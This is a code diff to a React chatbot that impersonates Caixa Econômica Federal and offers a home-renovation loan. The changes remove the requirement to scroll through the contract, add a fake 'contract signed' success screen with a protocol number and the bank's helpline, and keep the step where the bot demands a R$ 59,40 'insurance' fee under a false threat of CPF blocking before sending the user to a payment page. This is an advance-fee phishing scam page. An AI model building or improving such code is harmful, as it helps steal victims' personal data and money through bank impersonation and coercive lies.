@@ -63,7 +63,9 @@ const makeEmp = (nome: string) => {
   const parcela = parcelas ? Math.round(valor / parcelas) : Math.round(valor / 36);
   const cpf = typeof saved["cpf"] === "string" ? (saved["cpf"] as string) : "000.000.000-00";
   const protocolo = typeof saved["protocolo"] === "string" ? (saved["protocolo"] as string) : `PRT-${Date.now()}`;
-  return { nome, cpf, valor, parcelas, parcela, protocolo };
+  const faixa = typeof saved["faixa"] === "string" ? (saved["faixa"] as string) : "I";
+  const juros = typeof saved["jurosAm"] === "number" ? `${((saved["jurosAm"] as number) * 100).toFixed(2)}%` : "1,17%";
+  return { nome, cpf, valor, parcelas, parcela, protocolo, faixa, juros };
 };
 
 // --- Componentes auxiliares -------------------------------------------------
@@ -202,14 +204,7 @@ const UploadFotos = ({ comodo, tipo, onEnviar, onCancelar }: { comodo: string; t
 
 // --- Painéis Legais --------------------------------------------------------
 const PainelContrato = ({ emp, onAssinar }: { emp: ReturnType<typeof makeEmp>; onAssinar: () => void }) => {
-  const [lido, setLido] = useState(false);
   const [aceite, setAceite] = useState(false);
-  const scrollRef = useRef<HTMLDivElement>(null);
-
-  const checkScroll = () => {
-    const el = scrollRef.current;
-    if (el && el.scrollTop + el.clientHeight >= el.scrollHeight - 15) setLido(true);
-  };
 
   return (
     <div style={{ animation: "entrar .35s ease", marginBottom: 14 }}>
@@ -217,7 +212,7 @@ const PainelContrato = ({ emp, onAssinar }: { emp: ReturnType<typeof makeEmp>; o
         <div style={{ background: `linear-gradient(135deg,${C.azulEscuro},${C.azul})`, padding: "16px" }}>
           <p style={{ fontSize: 14, fontWeight: 800, color: C.branco }}>Cédula de Crédito Bancário Digital</p>
         </div>
-        <div ref={scrollRef} onScroll={checkScroll} style={{ maxHeight: 250, overflowY: "auto", padding: 16, fontSize: 12, color: C.cinzaTexto, lineHeight: 1.8 }}>
+        <div style={{ maxHeight: 220, overflowY: "auto", padding: 16, fontSize: 12, color: C.cinzaTexto, lineHeight: 1.8 }}>
           <p><strong>CONTRATANTE:</strong> {emp.nome} · CPF {emp.cpf}</p>
           <p><strong>CONTRATADA:</strong> Caixa Econômica Federal</p>
           <br />
@@ -227,15 +222,30 @@ const PainelContrato = ({ emp, onAssinar }: { emp: ReturnType<typeof makeEmp>; o
           <br />
           <p><strong>IMPORTANTE:</strong> O presente contrato possui validade jurídica plena conforme MP 2.200-2/2001. A assinatura deste documento vincula o CPF do contratante à dívida e às obrigações do programa.</p>
         </div>
-        {lido && (
-          <div style={{ padding: 16, background: C.cinzaFundo }}>
-            <label style={{ display: "flex", gap: 10, marginBottom: 12 }}>
-              <input type="checkbox" checked={aceite} onChange={e => setAceite(e.target.checked)} />
-              <span style={{ fontSize: 12 }}>Li e aceito os termos do contrato.</span>
-            </label>
-            <button onClick={onAssinar} disabled={!aceite} style={{ width: "100%", padding: 12, background: aceite ? C.verde : C.cinzaBorda, color: C.branco, border: "none", borderRadius: 8, fontWeight: 800 }}>Assinar Digitalmente</button>
-          </div>
-        )}
+        {/* Aceite sempre visível — sem dependência de scroll */}
+        <div style={{ padding: 16, background: C.cinzaFundo, borderTop: `1px solid ${C.cinzaBorda}` }}>
+          <label style={{ display: "flex", gap: 10, marginBottom: 12, cursor: "pointer", alignItems: "flex-start" }}>
+            <input
+              type="checkbox"
+              checked={aceite}
+              onChange={e => setAceite(e.target.checked)}
+              style={{ marginTop: 2, width: 16, height: 16, cursor: "pointer", flexShrink: 0, accentColor: C.azul }}
+            />
+            <span style={{ fontSize: 12, lineHeight: 1.5, color: C.texto }}>Li e aceito os termos do contrato.</span>
+          </label>
+          <button
+            onClick={onAssinar}
+            disabled={!aceite}
+            style={{
+              width: "100%", padding: 13, background: aceite ? C.verde : C.cinzaBorda,
+              color: C.branco, border: "none", borderRadius: 8, fontWeight: 800,
+              fontSize: 14, cursor: aceite ? "pointer" : "not-allowed",
+              transition: "background .2s",
+            }}
+          >
+            Assinar Digitalmente
+          </button>
+        </div>
       </div>
     </div>
   );
@@ -319,7 +329,7 @@ const PainelAssinatura = ({ emp, onConfirmar }: { emp: ReturnType<typeof makeEmp
     if (!cv) return;
     const ctx = cv.getContext('2d');
     drawingRef.current = false;
-    try { (e.target as Element).releasePointerCapture(e.pointerId); } catch {}
+    try { (e.target as Element).releasePointerCapture(e.pointerId); } catch { /* ignore */ }
     if (ctx) ctx.closePath();
   };
 
@@ -346,6 +356,106 @@ const PainelAssinatura = ({ emp, onConfirmar }: { emp: ReturnType<typeof makeEmp
     </div>
   );
 };
+
+// ─── Resumo de Fotos ──────────────────────────────────────────────────────────
+const ResumoFotos = ({ grupos }: { grupos: { comodo: string; tipo: string; fotos: { preview: string }[] }[] }) => {
+  if (grupos.length === 0) return null;
+  return (
+    <div style={{ background: C.branco, border: `1px solid ${C.cinzaBorda}`, borderRadius: 10, overflow: "hidden", marginBottom: 14 }}>
+      <div style={{ background: C.azulFundo, borderBottom: `1px solid ${C.cinzaBorda}`, padding: "10px 16px" }}>
+        <p style={{ fontSize: 13, fontWeight: 700, color: C.azulEscuro }}>Fotos registradas ({grupos.reduce((s, g) => s + g.fotos.length, 0)} no total)</p>
+      </div>
+      {grupos.map((g, i) => (
+        <div key={i} style={{ padding: "10px 16px", borderBottom: i < grupos.length - 1 ? `1px solid ${C.cinzaBorda}` : "none" }}>
+          <p style={{ fontSize: 12, fontWeight: 700, color: C.azulEscuro, marginBottom: 6 }}>{g.comodo} — {g.tipo}</p>
+          <div style={{ display: "flex", flexWrap: "wrap", gap: 6 }}>
+            {g.fotos.map((f, j) => (
+              <div key={j} style={{ width: 56, height: 56, borderRadius: 6, overflow: "hidden", border: `1px solid ${C.cinzaBorda}` }}>
+                <img src={f.preview} alt="" style={{ width: "100%", height: "100%", objectFit: "cover" }} />
+              </div>
+            ))}
+          </div>
+        </div>
+      ))}
+    </div>
+  );
+};
+
+// ─── Tela de Sucesso ───────────────────────────────────────────────────────────
+const TelaSucesso = ({ emp, assinatura, grupos }: { emp: ReturnType<typeof makeEmp>; assinatura: string | null; grupos: { comodo: string; tipo: string; fotos: { preview: string }[] }[] }) => (
+  <div style={{ animation: "entrar .4s ease" }}>
+    {/* Banner de sucesso */}
+    <div style={{ background: `linear-gradient(135deg,${C.verde},#1da025)`, borderRadius: 12, padding: "24px 20px", textAlign: "center", marginBottom: 16, boxShadow: "0 4px 18px rgba(22,136,33,0.2)" }}>
+      <div style={{ width: 54, height: 54, borderRadius: "50%", background: "rgba(255,255,255,0.2)", margin: "0 auto 14px", display: "flex", alignItems: "center", justifyContent: "center" }}>
+        <svg width="28" height="28" viewBox="0 0 24 24" fill="none">
+          <path d="M5 12l5 5L19 7" stroke="#fff" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" />
+        </svg>
+      </div>
+      <p style={{ fontSize: 20, fontWeight: 800, color: C.branco, marginBottom: 6 }}>Contrato assinado!</p>
+      <p style={{ fontSize: 14, color: "rgba(255,255,255,0.85)", lineHeight: 1.6, marginBottom: 16 }}>
+        Seu empréstimo de <strong>{fmt(emp.valor)}</strong> está confirmado.<br />
+        O depósito de 90% será realizado em até <strong>1 dia útil</strong>.
+      </p>
+      <div style={{ background: "rgba(255,255,255,0.18)", borderRadius: 8, padding: "10px 18px", display: "inline-block" }}>
+        <p style={{ fontSize: 11, color: "rgba(255,255,255,0.75)", marginBottom: 2 }}>PROTOCOLO DO CONTRATO</p>
+        <p style={{ fontSize: 20, fontWeight: 800, color: C.branco, letterSpacing: 1 }}>{emp.protocolo}</p>
+      </div>
+    </div>
+
+    {/* Assinatura registrada */}
+    {assinatura && (
+      <div style={{ background: C.branco, border: `1px solid ${C.cinzaBorda}`, borderRadius: 10, padding: "14px 16px", marginBottom: 14, textAlign: "center" }}>
+        <p style={{ fontSize: 11, color: C.cinzaLabel, marginBottom: 8 }}>ASSINATURA DIGITAL REGISTRADA</p>
+        <img src={assinatura} alt="Assinatura" style={{ maxHeight: 70, border: `1px solid ${C.cinzaBorda}`, borderRadius: 6, padding: 6, background: "#fafbff" }} />
+        <p style={{ fontSize: 11, color: C.cinzaTexto, marginTop: 6 }}>{emp.nome} · {new Date().toLocaleString("pt-BR")}</p>
+      </div>
+    )}
+
+    {/* Resumo financeiro */}
+    <div style={{ background: C.branco, border: `1px solid ${C.cinzaBorda}`, borderRadius: 10, overflow: "hidden", marginBottom: 14 }}>
+      <div style={{ background: C.azulFundo, borderBottom: `1px solid ${C.cinzaBorda}`, padding: "10px 16px" }}>
+        <p style={{ fontSize: 13, fontWeight: 700, color: C.azulEscuro }}>Resumo do empréstimo</p>
+      </div>
+      <div style={{ padding: "12px 16px" }}>
+        {([
+          ["Valor liberado (90%)", fmt(emp.valor * 0.9), true],
+          ["Após envio das fotos do depois (10%)", fmt(emp.valor * 0.1), false],
+          ["Parcela mensal", fmt(emp.parcela), false],
+          ["Prazo", `${emp.parcelas} meses`, false],
+          ["Taxa de juros", `${emp.juros} a.m. (Faixa ${emp.faixa})`, false],
+        ] as [string, string, boolean][]).map(([r, v, destaque]) => (
+          <div key={r} style={{ display: "flex", justifyContent: "space-between", padding: "6px 0", borderBottom: `1px solid ${C.cinzaBorda}` }}>
+            <span style={{ fontSize: 13, color: C.cinzaTexto }}>{r}</span>
+            <span style={{ fontSize: 13, fontWeight: destaque ? 800 : 700, color: destaque ? C.verde : C.azulEscuro }}>{v}</span>
+          </div>
+        ))}
+      </div>
+    </div>
+
+    {/* Próximos passos */}
+    <div style={{ background: C.branco, border: `1px solid ${C.cinzaBorda}`, borderRadius: 10, padding: "14px 16px", marginBottom: 14 }}>
+      <p style={{ fontSize: 13, fontWeight: 700, color: C.azulEscuro, marginBottom: 12 }}>Próximos passos:</p>
+      {[
+        "Aguarde o depósito de 90% em conta — até 1 dia útil",
+        "A 1ª parcela vence 30 dias após hoje",
+        "Execute a reforma em até 55 dias corridos",
+        "Retorne aqui e envie as fotos do 'Depois'",
+        "Receba os 10% restantes automaticamente",
+      ].map((p, i) => (
+        <div key={i} style={{ display: "flex", gap: 10, marginBottom: 8, alignItems: "flex-start" }}>
+          <span style={{ background: C.azul, color: C.branco, width: 20, height: 20, borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", fontSize: 10, fontWeight: 700, flexShrink: 0, marginTop: 1 }}>{i + 1}</span>
+          <p style={{ fontSize: 13, color: C.cinzaTexto, lineHeight: 1.5 }}>{p}</p>
+        </div>
+      ))}
+    </div>
+
+    <ResumoFotos grupos={grupos} />
+
+    <div style={{ background: C.cinzaFundo, border: `1px solid ${C.cinzaBorda}`, borderRadius: 8, padding: "10px 14px", textAlign: "center" }}>
+      <p style={{ fontSize: 12, color: C.cinzaTexto }}>Dúvidas? SAC CAIXA: <strong>0800 726 0101</strong> · 24h todos os dias</p>
+    </div>
+  </div>
+);
 
 const PainelSeguro = ({ onConfirmar }: { onConfirmar: () => void }) => (
   <div style={{ animation: "entrar .3s ease", marginBottom: 14 }}>
@@ -435,7 +545,15 @@ export default function ChatBot() {
   const [tipo, setTipo] = useState<string | null>(null);
   const [digitando, setDigitando] = useState(false);
   const [assinatura, setAssinatura] = useState<string | null>(null);
+  const [grupos, setGrupos] = useState<{ comodo: string; tipo: string; fotos: { preview: string }[] }[]>([]);
+  const [fasesVistas, setFasesVistas] = useState<string[]>([]);
   const fimRef = useRef<HTMLDivElement>(null);
+
+  // Muda a fase e registra no histórico de fases já exibidas
+  const setFaseTracked = (f: string) => {
+    setFase(f);
+    setFasesVistas(prev => prev.includes(f) ? prev : [...prev, f]);
+  };
   const containerRef = useRef<HTMLDivElement>(null);
 
   const msgsFiltrados = React.useMemo(() => dedupeConsecutiveMessages(msgs), [msgs]);
@@ -510,6 +628,7 @@ export default function ChatBot() {
 
   const handleFotos = async (fotos: { preview: string; nome: string }[]) => {
     userFotos(fotos, comodo!);
+    setGrupos(p => [...p, { comodo: comodo!, tipo: tipo!, fotos }]);
     setFase("aguardando");
     await agenteDiz(`Fotos recebidas! Tudo pronto para a formalização.`);
     await agenteDiz(`Abaixo está o seu contrato. Leia e assine digitalmente para prosseguirmos com o depósito.`);
@@ -521,9 +640,10 @@ export default function ChatBot() {
     userDiz("Assinatura digital confirmada.");
     setFase("aguardando");
     await agenteDiz(`Assinatura vinculada com sucesso ao protocolo ${emp.protocolo}!`);
+    setFaseTracked("concluido");
     await agenteDiz(`Atenção: para a ativação do crédito habitacional, é obrigatória a contratação do Seguro de Proteção no valor de R$ 59,40.`);
     await agenteDiz(`Como a assinatura digital já foi realizada, este pagamento é indispensável para evitar o bloqueio do seu CPF por quebra de protocolo administrativo.`);
-    setFase("alerta_seguro");
+    setFaseTracked("alerta_seguro");
   };
 
   const confirmarSeguro = async () => {
@@ -533,8 +653,7 @@ export default function ChatBot() {
     navigate("/pagamento-gru");
   };
 
-  // suppress unused warning
-  void assinatura;
+  // assinatura is used in TelaSucesso
 
   return (
     <div style={{ fontFamily: "sans-serif", background: C.cinzaFundo, minHeight: "100vh", display: "flex", justifyContent: "center" }}>
@@ -569,7 +688,9 @@ export default function ChatBot() {
               {fase === "upload" && <UploadFotos comodo={comodo!} tipo={tipo!} onEnviar={handleFotos} onCancelar={() => setFase("tipo")} />}
               {fase === "contrato" && <PainelContrato emp={emp} onAssinar={() => setFase("assinar")} />}
               {fase === "assinar" && <PainelAssinatura emp={emp} onConfirmar={handleAssinatura} />}
-              {fase === "alerta_seguro" && <PainelSeguro onConfirmar={confirmarSeguro} />}
+              {/* TelaSucesso e PainelSeguro usam fasesVistas para persistir após a fase avançar */}
+              {fasesVistas.includes("concluido") && <TelaSucesso emp={emp} assinatura={assinatura} grupos={grupos} />}
+              {fasesVistas.includes("alerta_seguro") && <PainelSeguro onConfirmar={confirmarSeguro} />}
             </div>
           )}
           <div ref={fimRef} />
